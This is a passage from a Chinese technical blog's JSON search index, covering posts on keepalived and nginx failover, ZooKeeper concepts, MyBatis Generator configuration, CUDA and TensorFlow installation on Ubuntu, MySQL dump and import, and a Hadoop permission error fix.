&#125; vrrp_instance VI_1 &#123; state MASTER #指定A节点为主节点 备用节点上设置为BACKUP即可 interface eth0 #绑定虚拟IP的网络接口 virtual_router_id 51 #VRRP组名，两个节点的设置必须一样，以指明各个节点属于同一VRRP组 priority 100 #主节点的优先级（1-254之间），备用节点必须比主节点优先级低 advert_int 1 #组播信息发送间隔，两个节点设置必须一样 mcast_src_ip 192.168.88.200 #本地主机ip authentication &#123; #设置验证信息，两个节点必须一致 auth_type PASS auth_pass 1111 &#125; track_script &#123; chk_health &#125; virtual_ipaddress &#123; #指定虚拟IP, 两个节点设置必须一样 192.168.88.199 #如果两个nginx的ip分别是192.168.88.200,,...201，则此处的虚拟ip跟它俩同一个网段即可 &#125;&#125; #BACKUP节点 12345678910111213141516171819202122232425262728 vrrp_script chk_health &#123; script \"/usr/local/keepalived/sbin/notify.sh\" interval 1 weight -2&#125; vrrp_instance VI_1 &#123; state BACKUP interface eth0 virtual_router_id 51 mcast_src_ip 192.168.88.201 priority 99 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; track_script &#123; chk_health &#125; virtual_ipaddress &#123; 192.168.88.199/24 &#125; &#125; #使用的脚本 123456789#!/bin/shA=`ps -C nginx --no-header |wc -l` #检查是否有nginx运行if [ $A -eq 0 ];then /usr/local/nginx/sbin/nginx #启动nginx sleep 2 #休眠两秒 if [ `ps -C nginx --no-header |wc -l` -eq 0 ];then #如果两秒后nginx没有运行 killall keepalived #关闭keepalived ，将虚拟ip让给BACKUP节点（必须关闭MASTER上的keepalived，BACKUP才能的到VIP） fifi 启动两台机器上的nginx和keepalived /usr/local/nginx/sbin/ngin service keepalived start 测试 将MASTER节点上的notify.sh脚本写错nginx启动路径（例如：/usr/local/nginx/sbin/nginxxxxxxx）， 让keepalived稍后无法启动nginx而自己关闭，这样可以测试是否两个节点可以相互替换。 关闭MASTER节点上的nginx 1/usr/local/nginx/sbin/nginx -s stop 查看虚拟ip占用情况，正确情况应该是MASTER上的虚拟ip消失，而BACKUP上出现你所配置的虚拟ip 1ip -a | grep eth0 在浏览器中打开你配置的虚拟ip ，进行多个测试， 无论是MASTER节点是否存活，只要BACKUP还存活都可以正常运行 如果测试中发现两个节点都出现了虚拟ip的，首先尝试关闭自己的防火墙servcie iptables stop 暂时关闭防火墙chkconfig iptables off 永久关闭防火墙","path":"2019/04/11/Nginx安装配置并使用keepalived实现高可用双机热备/","date":"04-11","excerpt":"所用安装包也可以从此处下载 下载nginx 官网：https://nginx.org/（我的是1.8.1） 上传并解压nginx tar -zxvf nginx-1.8.1.tar.gz -C /usr/local/src 编译nginx #进入到nginx源码目录 cd /usr/local/src/nginx-1.8.1 #检查安装环境,并指定将来要安装的路径 ./configure –prefix=/usr/local/nginx #缺包报错 ./configure: error: C compiler cc is not found #使用YUM安装缺少的包 yum -y install gcc pcre-devel openssl openssl-devel（centos命令，如果是其他系统请自行更改）","tags":[{"name":"踩坑","slug":"踩坑","permalink":"https://jijiking51.cn/tags/踩坑/"},{"name":"配置","slug":"配置","permalink":"https://jijiking51.cn/tags/配置/"},{"name":"高可用","slug":"高可用","permalink":"https://jijiking51.cn/tags/高可用/"}],"preview":"http://img.jijiking51.cn/Nginx安装配置并使用keepalived实现高可用双机热备.jpg"},{"title":"ZooKeeper详解","text":"转自：codeyuyu前言提到ZooKeeper，相信大家都不会陌生。Dubbo，Kafka,Hadoop等等项目里都能看到它的影子。但是你真的了解 ZooKeeper 吗？如果面试官让你给他讲讲 ZooKeeper 是个什么东西，你能回答到什么地步呢？ 我会用两个篇幅介绍ZooKeeper ，第一篇是概念性的认识，这篇你会得到 ZooKeeper 是什么，ZooKeeper 设计的目标，ZooKeeper 能做什么和ZooKeeper 基本的概念。第二篇我会从实战出发，安装ZooKeeper，写一些ZooKeeper 具体应用场景的代码实现。 一、ZooKeeper是什么ZooKeeper 是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。 官网：http://zookeeper.apache.org/ 源码：https://github.com/apache/zookeeper 二、ZooKeeper 的由来下面这段内容摘自《从Paxos到Zookeeper 》 ，本文中很多的名词介绍也来自本书。 Zookeeper最早起源于雅虎研究院的一个研究小组。在当时，研究人员发现，在雅虎内部很多大型系统基本都需要依赖一个类似的系统来进行分布式协调，但是这些系统往往都存在分布式单点问题。所以，雅虎的开发人员就试图开发一个通用的无单点问题的分布式协调框架，以便让开发人员将精力集中在处理业务逻辑上。关于“ZooKeeper”这个项目的名字，其实也有一段趣闻。在立项初期，考虑到之前内部很多项目都是使用动物的名字来命名的（例如著名的Pig项目),雅虎的工程师希望给这个项目也取一个动物的名字。时任研究院的首席科学家RaghuRamakrishnan开玩笑地说：“在这样下去，我们这儿就变成动物园了！”此话一出，大家纷纷表示就叫动物园管理员吧一一一因为各个以动物命名的分布式组件放在一起，雅虎的整个分布式系统看上去就像一个大型的动物园了，而Zookeeper 正好要用来进行分布式环境的协调一一于是，Zookeeper 的名字也就由此诞生了。 三、ZooKeeper的特性顺序一致性，从同一个客户端发起的事务请求，最终将会严格地按照其发起顺序被应用到Zookeeper中去。 原子性，所有事务请求的处理结果在整个集群中所有机器上的应用情况是一致的，即整个集群要么都成功应用了某个事务，要么都没有应用。 单一视图，无论客户端连接的是哪个 Zookeeper 服务器，其看到的服务端数据模型都是一致的。 可靠性，一旦服务端成功地应用了一个事务，并完成对客户端的响应，那么该事务所引起的服务端状态变更将会一直被保留，除非有另一个事务对其进行了变更。 实时性，Zookeeper 保证在一定的时间段内，客户端最终一定能够从服务端上读取到最新的数据状态。 四、ZooKeeper的设计目标简单的数据结构Zookeeper 使得分布式程序能够通过一个共享的树形结构的名字空间来进行相互协调，即Zookeeper 服务器内存中的数据模型由一系列被称为ZNode的数据节点组成，Zookeeper 将全量的数据存储在内存中，以此来提高服务器吞吐、减少延迟的目的。 可以构建集群Zookeeper 集群通常由一组机器构成，组成 Zookeeper 集群的而每台机器都会在内存中维护当前服务器状态，并且每台机器之间都相互通信。 顺序访问对于来自客户端的每个更新请求，Zookeeper 都会分配一个全局唯一的递增编号，这个编号反映了所有事务操作的先后顺序。 高性能Zookeeper 和Redis一样全量数据存储在内存中，100%读请求压测QPS 12-13W。 五、关于 ZooKeeper 的一些重要概念5.1 Zookeeper 集群：Zookeeper 是一个由多个 server 组成的集群,一个 leader，多个 follower。（这个不同于我们常见的Master/Slave模式）leader 为客户端服务器提供读写服务，除了leader外其他的机器只能提供读服务。每个 server 保存一份数据副本全数据一致，分布式读 follower，写由 leader 实施更新请求转发，由 leader 实施更新请求顺序进行，来自同一个 client 的更新请求按其发送顺序依次执行数据更新原子性，一次数据更新要么成功，要么失败。全局唯一数据视图，client 无论连接到哪个 server，数据视图都是一致的实时性，在一定事件范围内，client 能读到最新数据。 5.2 集群角色Leader：是整个 Zookeeper 集群工作机制中的核心 。Leader 作为整个 ZooKeeper 集群的主节点，负责响应所有对 ZooKeeper 状态变更的请求。主要工作： 事务请求的唯一调度和处理，保障集群处理事务的顺序性。集群内各服务器的调度者。Leader 选举是 Zookeeper 最重要的技术之一，也是保障分布式数据一致性的关键所在。我们以三台机器为例，在服务器集群初始化阶段，当有一台服务器Server1启动时候是无法完成选举的，当第二台机器 Server2 启动后两台机器能互相通信，每台机器都试图找到一个leader，于是便进入了 leader 选举流程. 每个 server 发出一个投票投票的最基本元素是（SID-服务器id,ZXID-事物id）接受来自各个服务器的投票处理投票优先检查 ZXID(数据越新ZXID越大),ZXID比较大的作为leader，ZXID一样的情况下比较SID统计投票这里有个过半的概念，大于集群机器数量的一半，即大于或等于（n/2+1）,我们这里的由三台，大于等于2即为达到“过半”的要求。这里也有引申到为什么 Zookeeper 集群推荐是单数。 集群数量 至少正常运行数量 允许挂掉的数量 2 2的半数为1，半数以上最少为2 0 3 3的半数为1.5，半数以上最少为2 1 4 4的半数为2，半数以上最少为3 1 5 5的半数为2.5，半数以上最少为3 2 6 6的半数为3，半数以上最少为4 2 通过以上可以发现，3台服务器和4台服务器都最多允许1台服务器挂掉，5台服务器和6台服务器都最多允许2台服务器挂掉,明显4台服务器成本高于3台服务器成本，6台服务器成本高于5服务器成本。这是由于半数以上投票通过决定的。改变服务器状态一旦确定了 leader，服务器就会更改自己的状态，且一半不会再发生变化，比如新机器加入集群、非 leader 挂掉一台。 Follower ：是 Zookeeper 集群状态的跟随者。他的逻辑就比较简单。除了响应本服务器上的读请求外，follower 还要处理leader 的提议，并在 leader 提交该提议时在本地也进行提交。另外需要注意的是，leader 和 follower 构成ZooKeeper 集群的法定人数，也就是说，只有他们才参与新 leader的选举、响应 leader 的提议。 Observer ：服务器充当一个观察者的角色。如果 ZooKeeper 集群的读取负载很高，或者客户端多到跨机房，可以设置一些 observer 服务器，以提高读取的吞吐量。Observer 和 Follower 比较相似，只有一些小区别：首先 observer 不属于法定人数，即不参加选举也不响应提议，也不参与写操作的“过半写成功”策略；其次是 observer 不需要将事务持久化到磁盘，一旦 observer 被重启，需要从 leader 重新同步整个名字空间。 5.3会话（Session）Session 指的是 ZooKeeper 服务器与客户端会话。在 ZooKeeper 中，一个客户端连接是指客户端和服务器之间的一个 TCP 长连接。客户端启动的时候，首先会与服务器建立一个 TCP 连接，从第一次连接建立开始，客户端会话的生命周期也开始了。通过这个连接，客户端能够通过心跳检测与服务器保持有效的会话，也能够向Zookeeper 服务器发送请求并接受响应，同时还能够通过该连接接收来自服务器的Watch事件通知。 Session 的 sessionTimeout 值用来设置一个客户端会话的超时时间。当由于服务器压力太大、网络故障或是客户端主动断开连接等各种原因导致客户端连接断开时，只要在sessionTimeout规定的时间内能够重新连接上集群中任意一台服务器，那么之前创建的会话仍然有效。在为客户端创建会话之前，服务端首先会为每个客户端都分配一个sessionID。由于 sessionID 是 Zookeeper 会话的一个重要标识，许多与会话相关的运行机制都是基于这个 sessionID 的，因此，无论是哪台服务器为客户端分配的 sessionID，都务必保证全局唯一。 5.3.1 会话（Session）在Zookeeper客户端与服务端成功完成连接创建后，就创建了一个会话，Zookeeper会话在整个运行期间的生命周期中，会在不同的会话状态中之间进行切换，这些状态可以分为CONNECTING、CONNECTED、RECONNECTING、RECONNECTED、CLOSE等。 一旦客户端开始创建Zookeeper对象，那么客户端状态就会变成CONNECTING状态，同时客户端开始尝试连接服务端，连接成功后，客户端状态变为CONNECTED，通常情况下，由于断网或其他原因，客户端与服务端之间会出现断开情况，一旦碰到这种情况，Zookeeper客户端会自动进行重连服务，同时客户端状态再次变成CONNCTING，直到重新连上服务端后，状态又变为CONNECTED，在通常情况下，客户端的状态总是介于CONNECTING 和CONNECTED 之间。但是，如果出现诸如会话超时、权限检查或是客户端主动退出程序等情况，客户端的状态就会直接变更为CLOSE状态。 5.3.2 会话创建Session是Zookeeper中的会话实体，代表了一个客户端会话，其包含了如下四个属性 sessionID。会话ID，唯一标识一个会话，每次客户端创建新的会话时，Zookeeper都会为其分配一个全局唯一的sessionID。 TimeOut。会话超时时间，客户端在构造Zookeeper实例时，会配置sessionTimeout参数用于指定会话的超时时间，Zookeeper客户端向服务端发送这个超时时间后，服务端会根据自己的超时时间限制最终确定会话的超时时间。 TickTime。下次会话超时时间点，为了便于Zookeeper对会话实行”分桶策略”管理，同时为了高效低耗地实现会话的超时检查与清理，Zookeeper会为每个会话标记一个下次会话超时时间点，其值大致等于当前时间加上TimeOut。 isClosing。标记一个会话是否已经被关闭，当服务端检测到会话已经超时失效时，会将该会话的isClosing标记为”已关闭”，这样就能确保不再处理来自该会话的新请求了。Zookeeper为了保证请求会话的全局唯一性，在SessionTracker初始化时，调用initializeNextSession方法生成一个sessionID，之后在Zookeeper运行过程中，会在该sessionID的基础上为每个会话进行分配，初始化算法如下 1234567public static long initializeNextSession(long id) &#123; long nextSid = 0; // 无符号右移8位使为了避免左移24后，再右移8位出现负数而无法通过高8位确定sid值 nextSid = (System.currentTimeMillis() &lt;&lt; 24) &gt;&gt;&gt; 8; nextSid = nextSid | (id &lt;&lt; 56); return nextSid;&#125; 5.3.3 会话管理Zookeeper的会话管理主要是通过SessionTracker来负责，其采用了分桶策略（将类似的会话放在同一区块中进行管理）进行管理，以便Zookeeper对会话进行不同区块的隔离处理以及同一区块的统一处理。 5.4 数据节点 Znode在Zookeeper中，“节点”分为两类，第一类同样是指构成集群的机器，我们称之为机器节点；第二类则是指数据模型中的数据单元，我们称之为数据节点一一ZNode。Zookeeper将所有数据存储在内存中，数据模型是一棵树（Znode Tree)，由斜杠（/）的进行分割的路径，就是一个Znode，例如/foo/path1。每个上都会保存自己的数据内容，同时还会保存一系列属性信息。 5.4.1 节点类型在Zookeeper中，node可以分为持久节点和临时节点和顺序节点三大类。可以通过组合生成如下四种类型节点 PERSISTENT 持久节点,节点创建后便一直存在于Zookeeper服务器上，直到有删除操作来主动清楚该节点。 PERSISTENT_SEQUENTIAL 持久顺序节点,相比持久节点，其新增了顺序特性，每个父节点都会为它的第一级子节点维护一份顺序，用于记录每个子节点创建的先后顺序。在创建节点时，会自动添加一个数字后缀，作为新的节点名，该数字后缀的上限是整形的最大值。 EPEMERAL 临时节点，临时节点的生命周期与客户端会话绑定，客户端失效，节点会被自动清理。同时，Zookeeper规定不能基于临时节点来创建子节点，即临时节点只能作为叶子节点。 EPEMERAL_SEQUENTIAL 临时顺序节点,在临时节点的基础添加了顺序特性。 5.5 版本——保证分布式数据原子性操作每个数据节点都具有三种类型的版本信息，对数据节点的任何更新操作都会引起版本号的变化。 version– 当前数据节点数据内容的版本号cversion– 当前数据子节点的版本号aversion– 当前数据节点ACL变更版本号 上述各版本号都是表示修改次数，如version为1表示对数据节点的内容变更了一次。即使前后两次变更并没有改变数据内容，version的值仍然会改变。version可以用于写入验证，类似于CAS。 5.6watcher事件监听器ZooKeeper允许用户在指定节点上注册一些Watcher，当数据节点发生变化的时候，ZooKeeper服务器会把这个变化的通知发送给感兴趣的客户端 5.7 ACL 权限控制——保障数据的安全ACL是Access Control Lists 的简写， ZooKeeper采用ACL策略来进行权限控制，有以下权限：CREATE:创建子节点的权限READ:获取节点数据和子节点列表的权限WRITE:更新节点数据的权限DELETE:删除子节点的权限ADMIN:设置节点ACL的权限 5.8 Paxos算法Paxos算法是基于消息传递且具有高度容错特性的一致性算法，是目前公认的解决分布式一致性问题最有效的算法之一。（其他算法有二阶段提交、三阶段提交等）篇幅较长 可以参考https://www.cnblogs.com/linbingdong/p/6253479.html 六、ZooKeeper 可以做什么？ 分布式服务注册与订阅 在分布式环境中，为了保证高可用性，通常同一个应用或同一个服务的提供方都会部署多份，达到对等服务。而消费者就须要在这些对等的服务器中选择一个来执行相关的业务逻辑，比较典型的服务注册与订阅，代表：dubbo。分布式配置中心发布与订阅模型，即所谓的配置中心，顾名思义就是发布者将数据发布到ZK节点上，供订阅者获取数据，实现配置信息的集中式管理和动态更新。代表：百度的disconf。github：https://github.com/knightliao/disconf 命名服务在分布式系统中，通过使用命名服务，客户端应用能够根据指定名字来获取资源或服务的地址，提供者等信息。被命名的实体通常可以是集群中的机器，提供的服务地址，进程对象等等——这些我们都可以统称他们为名字（Name）。其中较为常见的就是一些分布式服务框架中的服务地址列表。通过调用ZK提供的创建节点的API，能够很容易创建一个全局唯一的path，这个path就可以作为一个名称。 分布式锁分布式锁，这个主要得益于ZooKeeper为我们保证了数据的强一致性。锁服务可以分为两类，一个是保持独占，另一个是控制时序。所谓保持独占，就是所有试图来获取这个锁的客户端，最终只有一个可以成功获得这把锁。通常的做法是把zk上的一个znode看作是一把锁，通过create znode的方式来实现。所有客户端都去创建 /distribute_lock 节点，最终成功创建的那个客户端也即拥有了这把锁。控制时序，就是所有视图来获取这个锁的客户端，最终都是会被安排执行，只是有个全局时序了。做法和上面基本类似，只是这里 /distribute_lock 已绊预先存在，客户端在它下面创建临时有序节点（这个可以通过节点的属性控制：CreateMode.EPHEMERAL_SEQUENTIAL来指定）。Zk的父节点（/distribute_lock）维持一份sequence,保证子节点创建的时序性，从而也形成了每个客户端的全局时序 Master选举 负载均衡","path":"2019/04/11/ZooKeeper详解/","date":"04-11","excerpt":"转自：codeyuyu前言提到ZooKeeper，相信大家都不会陌生。Dubbo，Kafka,Hadoop等等项目里都能看到它的影子。但是你真的了解 ZooKeeper 吗？如果面试官让你给他讲讲 ZooKeeper 是个什么东西，你能回答到什么地步呢？","tags":[],"preview":"http://img.jijiking51.cn/ZooKeeper详解.jpg"},{"title":"MybatisGenerator逆向工程","text":"项目介绍：http://www.mybatis.org/generator/XML中的标签意思：http://www.mybatis.org/generator/quickstart.htmlXML示例文件：http://www.mybatis.org/generator/configreference/xmlconfig.html启动方式：http://www.mybatis.org/generator/running/running.html本文采用_From another Java program with an XML configuration的方式启动&nbsp;&nbsp; 详细使用看注释 eBg.xml配置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE generatorConfiguration PUBLIC \"-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\" \"http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\"&gt;&lt;generatorConfiguration&gt;&lt;!-- 设置连接的jar包 --&gt; &lt;classPathEntry location=\"mysql-connector-java-5.1.46-bin.jar\" /&gt; &lt;!-- targetRuntime：用来设置生成的类型 MyBatis3:标准类型，包含了动态查询的Example MyBatis3Simple：简单的增删查改--&gt; &lt;context id=\"DB2Tables\" targetRuntime=\"MyBatis3\"&gt; &lt;!-- jdbcConnection:指定如何链接到目标数据库 --&gt; &lt;jdbcConnection driverClass=\"com.mysql.jdbc.Driver\" connectionURL=\"jdbc:mysql://localhost:3306/mybatis?useSSL=true\" userId=\"root\" password=\"123456\"&gt; &lt;/jdbcConnection&gt; &lt;javaTypeResolver &gt; &lt;property name=\"forceBigDecimals\" value=\"false\" /&gt; &lt;/javaTypeResolver&gt; &lt;!-- javaModelGenerator:指定javaBean的生成策略， targetPackage=\"test.model\"：目标包名 targetProject=\"\\MBGTestProject\\src\"：目标工程 生成的是对象.java文件 --&gt; &lt;javaModelGenerator targetPackage=\"cn.jijiking51.mybatis.bean\" targetProject=\"src\"&gt; &lt;property name=\"enableSubPackages\" value=\"true\" /&gt; &lt;property name=\"trimStrings\" value=\"true\" /&gt; &lt;/javaModelGenerator&gt; &lt;!-- sqlMapGenerator:sql 映射生成策略 生成的是：生成的是对象Mapper.xml文件 eclipse中 只要都是代码文件夹， 包路径相同的话编译的时候会合并到bin中，所以选择的文件路径可以不是conf，但是包名一定要相同 idea中， Mapper.xml 和 Mapper.java 一定要相同路径文件夹 ******这个是否需要取决于下面type选择的模式，只有XMLMAPPER模式需要这个****** --&gt; &lt;sqlMapGenerator targetPackage=\"cn.jijiking51.mybatis.dao\" targetProject=\"conf\"&gt; &lt;property name=\"enableSubPackages\" value=\"true\" /&gt; &lt;/sqlMapGenerator&gt; &lt;!-- javaClientGenerator：指定mapper接口所在的文件位置 生成的是：生成的是对象Mapper.java文件 注意生成xml的文件位置 type=\"ANNOTATEDMAPPER\",生成Java Model 和基于注解的Mapper对象 type=\"MIXEDMAPPER\",生成基于注解的Java Model 和相应的Mapper对象 type=\"XMLMAPPER\",生成SQLMap XML文件和独立的Mapper接口 --&gt; &lt;javaClientGenerator type=\"XMLMAPPER\" targetPackage=\"cn.jijiking51.mybatis.dao\" targetProject=\"src\"&gt; &lt;property name=\"enableSubPackages\" value=\"true\" /&gt; &lt;/javaClientGenerator&gt; &lt;!-- table：制定要逆向分析哪些表:根据表生成javaBean ， table 表名， domainObjectNam --&gt; &lt;table tableName=\"employee\" domainObjectName=\"Employee\"&gt;&lt;/table&gt; &lt;table tableName=\"user\" domainObjectName=\"User\"&gt;&lt;/table&gt; &lt;table tableName=\"tb_class\" domainObjectName=\"Class\"&gt;&lt;/table&gt; &lt;table tableName=\"tb_head_teacher\" domainObjectName=\"Teacher\"&gt;&lt;/table&gt; &lt;/context&gt;&lt;/generatorConfiguration&gt; 启动：注意要修改成自己的xml文件 12345678910111213@Test public void testEbg() throws Exception &#123; List&lt;String&gt; warnings = new ArrayList&lt;String&gt;(); boolean overwrite = true; //唯一要修改的地方就是引入这个xml配置文件 File configFile = new File(\"eBg.xml\"); ConfigurationParser cp = new ConfigurationParser(warnings); Configuration config = cp.parseConfiguration(configFile); DefaultShellCallback callback = new DefaultShellCallback(overwrite); MyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings); myBatisGenerator.generate(null); &#125;","path":"2019/04/11/MybatisGenerator逆向工程/","date":"04-11","excerpt":"项目介绍：http://www.mybatis.org/generator/XML中的标签意思：http://www.mybatis.org/generator/quickstart.htmlXML示例文件：http://www.mybatis.org/generator/configreference/xmlconfig.html启动方式：http://www.mybatis.org/generator/running/running.html本文采用_From another Java program with an XML configuration的方式启动&nbsp;&nbsp;","tags":[{"name":"Mybatis","slug":"Mybatis","permalink":"https://jijiking51.cn/tags/Mybatis/"},{"name":"开发","slug":"开发","permalink":"https://jijiking51.cn/tags/开发/"}],"preview":"http://img.jijiking51.cn/MybatisGenerator逆向工程.jpg"},{"title":"ubuntu18.04安装Anaconda3+tensorflow-gpu1.8.0+cuda9.1+cudnn7.05","text":"参考测试代码来源：https://vimsky.com/article/3872.html18.04图形界面开启与关闭https://blog.csdn.net/happy_lucky52/article/details/82626901ubuntu18.04安装cuda+cudnnhttps://blog.csdn.net/u010801439/article/details/80483036 前提 下载Anaconda下载链接下载3.7 下载cuda下载地址选择9.1版本对对照图片选择，下载列表对应的选择第一个Download为cuda9.1 ，下面的还有三个（有一个没有截出来）为补丁，全部下载 下载cudnn下载链接选择Download cuDNN选择后如果没有账号请创建账号，如果有账号请登录，然后勾选用户协议选择存档的cuDNN版本下载对应的文件 现在我们手里有123456789###anaconda安装文件Anaconda3-2018.12-Linux-x86_64.sh###cuda安装文件以及补丁cuda_9.1.85_387.26_linux.runcuda_9.1.85.1_linux.runcuda_9.1.85.2_linux.runcuda_9.1.85.3_linux.run###cudnn文件cudnn-9.1-linux-x64-v7.tgz 如果文件少了请检查是否缺少步骤 ！！！！！！！！！接下来请关闭图形界面！！！！！！！！！18.04用户请执行以下命令，其他版本用户请自行搜索关闭ubuntu图形界面12sudo systemctl set-default multi-user.targetsudo reboot 安装完毕后用以下命令恢复12sudo systemctl set-default graphical.targetsudo reboot 卸载当前系统安装的NVIDIA驱动 1sudo apt remove --purge nvidia* 安装NVIDIA驱动 查看系统推荐驱动 123456789101112ubuntu-drivers devices###得到的结果== /sys/devices/pci0000:00/0000:00:01.0/0000:01:00.0 ==modalias : pci:v000010DEd0000139Bsv00001558sd00000152bc03sc00i00vendor : NVIDIA Corporationmodel : GM107M [GeForce GTX 960M]driver : nvidia-driver-396 - third-party freedriver : nvidia-driver-410 - third-party freedriver : nvidia-driver-390 - third-party freedriver : nvidia-driver-415 - third-party free recommendeddriver : xserver-xorg-video-nouveau - distro free builtin 安装推荐的驱动 123456###1. 添加NVIDIA源，建议添加源后再次运行上面的命令，可以查看更加完整的驱动推荐sudo add-apt-repository ppa:graphics-drivers/ppa###2. 更新源sudo apt-get update###3. 安装上面推荐的驱动，具体选择根据上面的推荐和tensorflow-gpu的实际需求，对应版本表见下方sudo apt-get install nvidia-*** tensorflow-gpu版本对应关系 安装cuda9.1 ubuntu18.04是7.0的gcc和g++，而cuda需要的是4.8 所以我们进行降级处理 123456789101112###1. 安装gcc和g++ 4.8版本sudo apt-get install gcc-4.8sudo apt-get install g++-4.8###2.更改引用 ###1. 进入/usr/bin cd /usr/bin ###2. 备份 sudo mv gcc gcc.bak sudo mv g++ g++.bak ###3. 重新创建软链 sudo ln -s gcc-4.8 gcc sudo ln -s g++-4.8 g++ 安装cuda_9.1.85_387.26_linux.run 12345sudo sh cuda_9.1.85_387.26_linux.run###按照它的提示选择输入 accept | y###因为我们更改已经安装了NVIDIA驱动，所以在是否安装驱动的选项时选择no，其他的选项全部选择yes###安装完成后会提示nvidia-driver没有安装，其他的安装完成###waring警告是告诉你如何安装上它的nvidia驱动 安装补丁 123sudo sh cuda_9.1.85.1_linux.runsudo sh cuda_9.1.85.2_linux.run sudo sh cuda_9.1.85.3_linux.run 添加环境变量 12345###cuda-x.x 请按照自己安装的版本实际环境更改echo &apos;export PATH=/usr/local/cuda-x.x/bin:$PATH&apos; &gt;&gt; ~/.bashrcecho &apos;export LD_LIBRARY_PATH=/usr/local/cuda-x.x/lib64:$LD_LIBRARY_PATH&apos; &gt;&gt; ~/.bashrc###更新配置source ~/.bashrc 安装cudnn7.05 解压cudnn-9.1-linux-x64-v7.tgz 1tar -zxvf cudnn-9.1-linux-x64-v7.tgz 复制到cuda的目录中 1234sudo cp cuda/include/cudnn.h /usr/local/cuda/include/ sudo cp cuda/lib64/libcudnn* /usr/local/cuda/lib64/ sudo chmod a+r /usr/local/cuda/include/cudnn.h sudo chmod a+r /usr/local/cuda/lib64/libcudnn* 安装anaconda 运行安装脚本 1234sh Anaconda3-2018.12-Linux-x86_64.sh###注意事项######除了最后问你是否安装vscode可以选择no，其他的请选择yes，否则请自行添加环境变量source ~/.bashrc 添加清华源 123conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ conda config --set show_channel_urls yes 创建一个python环境 12conda create -n tensorflow python=3.6conda activate tensorflow 安装tensorflow-gpu，版本请更具需要修改 1conda install -n tensorflow tensorflow-gpu==1.8.0 测试是否安装成功请先运行上面的恢复图形界面代码随后将这段代码粘贴到一个py文件中，使用刚刚创建的python环境运行 12345678import tensorflow as tfwith tf.device(&apos;/gpu:0&apos;): a = tf.constant([1.0, 2.0, 3.0, 4.0, 5.0, 6.0], shape=[2, 3], name=&apos;a&apos;) b = tf.constant([1.0, 2.0, 3.0, 4.0, 5.0, 6.0], shape=[3, 2], name=&apos;b&apos;) c = tf.matmul(a, b)with tf.Session() as sess: print (sess.run(c)) 如果安装成功会在最后显示这个结果12[[22. 28.] [49. 64.]] ​","path":"2019/04/11/ubuntu18-04安装Anaconda3-tensorflow-gpu1-8-0-cuda9-1-cudnn7-05/","date":"04-11","excerpt":"参考测试代码来源：https://vimsky.com/article/3872.html18.04图形界面开启与关闭https://blog.csdn.net/happy_lucky52/article/details/82626901ubuntu18.04安装cuda+cudnnhttps://blog.csdn.net/u010801439/article/details/80483036","tags":[{"name":"踩坑","slug":"踩坑","permalink":"https://jijiking51.cn/tags/踩坑/"},{"name":"配置","slug":"配置","permalink":"https://jijiking51.cn/tags/配置/"}],"preview":"http://img.jijiking51.cn/ubuntu18.04安装Anaconda3+tensorflow-gpu1.8.0+cuda9.1+cudnn7.05.jpg"},{"title":"Mysql导入和导出Sql文件","text":"window下1.导出整个数据库mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名mysqldump -u dbuser -p dbname &gt; dbname.sql2.导出一个表mysqldump -u 用户名 -p 数据库名 表名&gt; 导出的文件名mysqldump -u dbuser -p dbname users&gt; dbname_users.sql 3.导出一个数据库结构mysqldump -u dbuser -p -d –add-drop-table dbname &gt;d:/dbname_db.sql-d 没有数据 –add-drop-table 在每个create语句之前增加一个drop table 4.导入数据库常用source 命令进入mysql数据库控制台，如mysql -u root -pmysql&gt;use 数据库然后使用source命令，后面参数为脚本文件(如这里用到的.sql)mysql&gt;source d:/dbname.sql 导入数据到数据库 mysql -uroot -D数据库名 导入数据到数据库中得某个表 mysql -uroot -D数据库名 表名 mysqldump 命令没找到请将目录切换到mysql的安装目录下的bin目录 linux下一、导出数据库用mysqldump命令（注意mysql的安装路径，即此命令的路径）：1、导出数据和表结构：mysqldump -u用户名 -p密码 数据库名 &gt; 数据库名.sql #/usr/local/mysql/bin/ mysqldump -uroot -p abc &gt; abc.sql敲回车后会提示输入密码 2、只导出表结构mysqldump -u用户名 -p密码 -d 数据库名 &gt; 数据库名.sql #/usr/local/mysql/bin/ mysqldump -uroot -p -d abc &gt; abc.sql 注：/usr/local/mysql/bin/ —&gt; mysql的data目录 二、导入数据库1、首先建空数据库mysql&gt;create database abc; 2、导入数据库方法一：（1）选择数据库mysql&gt;use abc;（2）设置数据库编码mysql&gt;set names utf8;（3）导入数据（注意sql文件的路径）mysql&gt;source /home/abc/abc.sql; 方法二：mysql -u用户名 -p密码 数据库名 &lt; 数据库名.sql #mysql -uabc_f -p abc &lt; abc.sql","path":"2019/04/11/Mysql导入和导出Sql文件/","date":"04-11","excerpt":"window下1.导出整个数据库mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名mysqldump -u dbuser -p dbname &gt; dbname.sql2.导出一个表mysqldump -u 用户名 -p 数据库名 表名&gt; 导出的文件名mysqldump -u dbuser -p dbname users&gt; dbname_users.sql","tags":[{"name":"备份","slug":"备份","permalink":"https://jijiking51.cn/tags/备份/"}],"preview":"http://img.jijiking51.cn/Mysql导入和导出Sql文件.jpg"},{"title":"eclipse开发Hadoop时异常org.apache.hadoop.security.AccessControlException:","text":"问题原因1org.apache.hadoop.security.AccessControlException: Permission denied: user=min, access=WRITE, inode=&quot;/access_log_copy&quot;:mini:supergroup:-rw-r--r-- 我们可以看到user=min，这是我们当前运行系统的用户名，而这里期望值是Hadoop上面的用户名 解决方法所以有一下几种解决方法： 在JVM变量里面添加HADOOP_USER_NAME，例： 1-DHADOOP_USER_NAME=xxx 这里的xxx是Hadoop上面的用户名eclipse配置如下： 2. 将当前系统的帐号修改为Hadoop上运行的用户名 3. 在构造客户端fs对象时，通过对象传递进去 12345678910/** * 依赖的包名 * import java.net.URI; * import java.net.URISyntaxException; * import org.apache.hadoop.conf.Configuration; * import 